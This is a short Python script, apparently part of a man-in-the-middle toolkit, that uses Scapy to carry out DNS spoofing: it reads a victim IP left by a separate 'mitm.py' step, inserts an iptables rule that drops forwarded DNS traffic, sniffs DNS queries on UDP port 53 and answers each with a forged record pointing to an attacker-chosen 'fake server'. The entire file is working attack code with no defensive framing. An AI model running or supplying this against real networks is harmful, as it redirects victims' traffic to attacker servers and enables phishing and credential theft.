from scapy.all import sniff, DNS, DNSQR, DNSRR, srp, IP, Ether, sendp, UDP
from subprocess import Popen, PIPE
import sys

file1 = open('id.txt', 'r')
victimIP = file1.read()
if victimIP == "":
    print("You must first run the mitm.py script")
    sys.exit()
file1.close()
print("Please chose the ip of the fake server:")
gotoIP = input()

firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP" 
Popen([firewall], shell=True, stdout=PIPE)

def dnsspoof(rec : IP):
    if rec.haslayer(DNS) and rec.getlayer(DNS).qr==0:
        spoof = (Ether()/ IP(dst=rec[IP].src, src=rec[IP].dst)/UDP(dport=rec[UDP].sport, sport=rec[UDP].dport)/DNS(id=rec[DNS].id, qd=rec[DNS].qd, qr=1,an=DNSRR(rrname=rec[DNS].qd.qname, ttl=10, rdata=gotoIP) ))
        sendp(spoof, verbose=1)



while True:
    a = sniff(prn = dnsspoof,count=1, filter="udp port 53")
    


        
    


    



